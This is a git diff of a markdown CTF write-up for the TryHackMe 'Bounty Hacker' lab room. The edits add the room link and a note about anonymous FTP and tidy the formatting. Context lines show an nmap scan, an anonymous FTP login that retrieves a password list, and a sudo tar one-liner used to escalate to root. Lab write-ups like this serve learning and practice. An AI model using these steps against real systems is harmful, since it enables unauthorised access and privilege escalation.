@@ -1,5 +1,7 @@
 # Bounty Hacker
 
+https://tryhackme.com/room/cowboyhacker
+
 ## NMAP Scan
 
 ```bash
@@ -43,12 +45,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 42.95 seconds
 ```
 
+Note that FTP anonymous access is allowed.
+
+
 ## FTP Anonymous Access
 
 ```bash
-❯ ftp -p $IP
+❯ ftp $IP
 ```
-```
+```bash
 Connected to 10.10.206.65.
 220 (vsFTPd 3.0.3)
 Name (10.10.206.65:eschaal): anonymous
@@ -66,7 +71,7 @@ ftp>
 
 Downloaded the `task.txt` and `locks.txt` files.
 
-task.txt
+`task.txt`
 ```
 1.) Protect Vicious.
 2.) Plan for Red Eye pickup on the moon.
@@ -74,7 +79,7 @@ task.txt
 -lin
 ```
 
-locks.txt
+`locks.txt`
 ```
 rEDdragOn$ynd1c473
 DrAgoN5ynD1cATE
@@ -140,3 +145,4 @@ sudo tar xf /dev/null -I '/bin/bash -c "bash <&2 1>&2"'
 root@bountyhacker:~/Desktop whoami
 root
 ```
+
